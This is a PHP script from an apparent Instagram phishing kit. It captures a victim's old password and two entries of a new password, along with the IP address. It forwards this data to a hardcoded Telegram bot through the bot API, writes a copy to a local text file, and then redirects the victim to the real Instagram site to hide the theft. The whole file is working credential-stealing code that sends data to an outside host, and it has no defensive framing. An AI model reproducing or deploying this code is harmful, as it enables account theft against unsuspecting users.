<?php
include('../blocker.php');
session_start();
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$foo);
$result = curl_exec($ch);
curl_close($ch);
function curl_get_contents($url)
{
  $curl = curl_init($url);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
  $data = curl_exec($curl);
  curl_close($curl);
  if(empty($data)){
	file_get_contents($url);
  } 
  return $data;
}
$ip = getenv("REMOTE_ADDR");
$message .= "---------------- Information personnal instagram-----------------\n";
$message .= "-----------------Info----------------------\n";
$message .= "OLD PASS  : ".$_POST['password0']."\n";
$message .= "NEW PASS   : ".$_POST['password1']."\n";
$message .= "NEW PASS   : ".$_POST['password2']."\n";
$message .= "------------------Info D'IP-------------------------\n";
$message .= "IP                : $ip\n";
$message .= "--------------- ---------------\n";

curl_get_contents("https://api.telegram.org/bot1664442529:AAG57-xnmv--JX0xHyS4fwT5FjoH4bQdO_Q/sendMessage?chat_id=1276149804&text=" . urlencode($message)."" );


$file = fopen("../info.txt","a");
fwrite($file,$message); 


echo '<script language="Javascript">
<!--
document.location.replace("https://www.instagram.com/");
// -->
</script>';
?>